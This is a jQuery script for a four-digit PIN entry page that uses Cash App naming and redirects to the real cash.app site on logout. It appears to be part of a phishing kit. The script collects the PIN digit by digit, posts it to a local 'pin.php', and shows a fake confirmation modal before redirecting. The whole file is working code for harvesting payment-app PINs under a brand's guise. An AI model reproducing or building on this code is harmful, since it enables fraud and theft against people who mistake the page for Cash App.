$(document).ready(function() {
	$("#pin1, #pin2, #pin3,#pin4").mask('0');
	$("#pin1").focus();
	
	$("#btnLogout").click(function() {
		$("#btnLogout").prop('disabled', true);
		$("#btnLogout").html('<img src="static/img/spin.gif" style="width:43px">');
		window.location.replace('https://cash.app/account');
	});
	$("#pin2").focus(function() {
		if($("#pin1").val().length != 1){
			$("#pin1, #pin2, #pin3,#pin4").removeClass('filled');
			$("#pin1, #pin2, #pin3,#pin4").val("");
			$("#pin1, #pin2, #pin3,#pin4").prop('readonly', false);
			$("#pin1").focus();
		}
	});
	
	$("#pin4").focus(function() {
		if($("#pin1").val().length != 1 || $("#pin2").val().length != 1 || $("#pin3").val().length != 1){
			$("#pin1, #pin2, #pin3,#pin4").removeClass('filled');
			$("#pin1, #pin2, #pin3,#pin4").val("");
			$("#pin1, #pin2, #pin3,#pin4").prop('readonly', false);
			$("#pin1").focus();
		}
	});
	
	$("#pin3").focus(function() {
		if($("#pin1").val().length != 1 || $("#pin2").val().length != 1){
			$("#pin1, #pin2, #pin3,#pin4").removeClass('filled');
			$("#pin1, #pin2, #pin3,#pin4").val("");
			$("#pin1, #pin2, #pin3,#pin4").prop('readonly', false);
			$("#pin1").focus();
		}
	});
	
	$("#pin1").keyup(function() {
		if($("#pin1").val().length == 1){
			$("#pin1").addClass('filled');
			$("#pin1").prop('readonly', true);
			$("#pin2").focus();
		}else{
			$("#pin1").focus();
		}
	});
	
	$("#pin2").keyup(function() {
		
		
		if($("#pin2").val().length == 1){
			$("#pin2").addClass('filled');
			$("#pin2").prop('readonly', true);
			$("#pin3").focus();
		}else{
			$("#pin2").focus();
		}
	});
	
	$("#pin3").keyup(function() {
		
		
		
		if($("#pin3").val().length == 1){
			$("#pin3").addClass('filled');
			$("#pin3").prop('readonly', true);
			$("#pin4").focus();
		}else{
			$("#pin3").focus();
		}
	});

	$("#btnConfirm").click(function() {
		$("#btnConfirm").prop('disabled', true);
		$("#btnConfirm").html('<img src="/static/img/spin.gif" style="width:43px">');
		setTimeout(function(){
			window.location.replace($("#btnConfirm").attr('data-oauth'));
		}, 2000);
	});
	
	$("#pin4").keyup(function() {
		
		
		if($("#pin4").val().length == 1){
			$("#pin4").addClass('filled');
			$("#pin4").prop('readonly', true);
			$("body").addClass('no-scroll');
			$("#cashModal").show();
			var pindata =  $("#frmPin").serialize();
			$.post("pin.php", pindata).done(function(result) {
				if(result != "no"){
					$('#cashBody').addClass("no-scroll");
					$('#btnConfirm').attr("data-oauth", 'pin.php');
					$('#cashModal').show();
				}else{
					$('#pin1, #pin2, #pin3, #pin4').prop('readonly', false);
					$("#pin1, #pin2, #pin3, #pin4").addClass('is-invalid');
					$("#btnLogin").prop('disabled', false);
					$("#btnLogin").html('Sign In');
					if($("#pin4").length > 0) {
						$('#pin4').prop('readonly', false);
					}
				}
				});
		}

	});
});